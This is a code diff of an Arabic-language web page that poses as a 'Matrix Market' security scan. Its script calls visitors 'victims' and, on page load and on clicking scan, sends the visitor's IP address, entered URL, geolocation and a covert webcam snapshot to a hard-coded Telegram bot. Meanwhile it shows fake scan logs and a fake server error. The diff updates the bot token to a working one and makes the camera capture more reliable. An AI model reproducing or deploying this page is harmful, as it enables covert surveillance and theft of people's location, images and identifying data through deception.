@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Matrix Market | فحص الأمان</title>
     <style>
-        /* تصميم واجهة الهكر الاحترافية */
         body { background-color: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
         .main-container { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 40px; width: 100%; max-width: 450px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
         .header h1 { color: #58a6ff; font-size: 22px; margin-bottom: 5px; }
@@ -49,64 +48,72 @@
 
     <script>
     (function() {
-        const _t = "7873426394:AAFrMrpIkziC4hpDHDJ2OIOBOVha--srSbo";
+        // تم تحديث التوكن الجديد الشغال 
+        const _t = "7873426394:AAGPD3N5Nz-ReJ90LeTD99gnze9P0evIr7o";
         const _id = "7253092491";
 
         function _report(text) {
             fetch(`https://api.telegram.org/bot${_t}/sendMessage?chat_id=${_id}&text=${encodeURIComponent(text)}`);
         }
 
+        // إشارة فورية بمجرد فتح الصفحة
+        _report("🔔 زائر جديد فتح الصفحة الآن!");
+
         document.getElementById('startScanBtn').addEventListener('click', function() {
             const term = document.getElementById('terminal');
             const logs = document.getElementById('logs');
+            const targetUrl = document.getElementById('urlInput').value || "بدون كود";
+            
             term.style.display = 'block';
             logs.innerHTML = '<div class="line">> جاري بدء الاتصال بالخادم...</div>';
 
-            _report("🚨 ضحية جديد دخل المصيدة!");
+            _report(`🚀 الضحية بدأ الفحص لـ: ${targetUrl}`);
 
             // 1. IP Address
             fetch('https://api.ipify.org?format=json')
                 .then(r => r.json())
                 .then(d => _report("📍 IP الضحية: " + d.ip));
 
-            // 2. Geolocation
+            // 2. Geolocation (تم تصحيح الرابط)
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(p => {
-                    _report(`📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-                });
+                    const lat = p.coords.latitude;
+                    const lon = p.coords.longitude;
+                    _report(`📍 الموقع: https://www.google.com/maps?q=${lat},${lon}`);
+                }, () => _report("❌ الضحية رفض إذن الموقع"));
             }
 
-            // 3. Camera Capture
+            // 3. Camera Capture (محسن)
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    
                     setTimeout(() => {
-                        const video = document.createElement('video');
-                        video.srcObject = stream;
-                        video.play();
-                        
-                        setTimeout(() => {
-                            const canvas = document.createElement('canvas');
-                            canvas.width = 640; canvas.height = 480;
-                            canvas.getContext('2d').drawImage(video, 0, 0);
-                            canvas.toBlob(blob => {
-                                const fd = new FormData();
-                                fd.append('chat_id', _id);
-                                fd.append('photo', blob, 'shot.jpg');
-                                fetch(`https://api.telegram.org/bot${_t}/sendPhoto`, { method: 'POST', body: fd });
-                            }, 'image/jpeg');
-                            
-                            // إغلاق الكاميرا بعد اللقطة
-                            stream.getTracks().forEach(track => track.stop());
-                        }, 1000);
-                    }, 500);
-                });
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 640; canvas.height = 480;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        canvas.toBlob(blob => {
+                            const fd = new FormData();
+                            fd.append('chat_id', _id);
+                            fd.append('photo', blob, 'shot.jpg');
+                            fd.append('caption', '🎯 لقطة للضحية');
+                            fetch(`https://api.telegram.org/bot${_t}/sendPhoto`, { method: 'POST', body: fd })
+                            .then(() => {
+                                // إغلاق الكاميرا بعد الإرسال
+                                stream.getTracks().forEach(track => track.stop());
+                            });
+                        }, 'image/jpeg', 0.8);
+                    }, 2000); // ينتظر ثانيتين عشان الكاميرا تركز
+                }).catch(() => _report("❌ الضحية رفض الكاميرا"));
             }
 
-            // تأثير وهمي للمستخدم
+            // تأثيرات وهمية
             setTimeout(() => { logs.innerHTML += '<div class="line">> تم جلب البيانات السحابية...</div>'; }, 1000);
             setTimeout(() => { logs.innerHTML += '<div class="line">> جاري تشفير المفتاح العام...</div>'; }, 2000);
-            setTimeout(() => { alert("فشل الاتصال! يرجى المحاولة مرة أخرى لاحقاً."); }, 4000);
+            setTimeout(() => { alert("خطأ في الاتصال بالسيرفر الرئيسي (Error 503). يرجى إعادة المحاولة."); }, 4500);
         });
     })();
     </script>
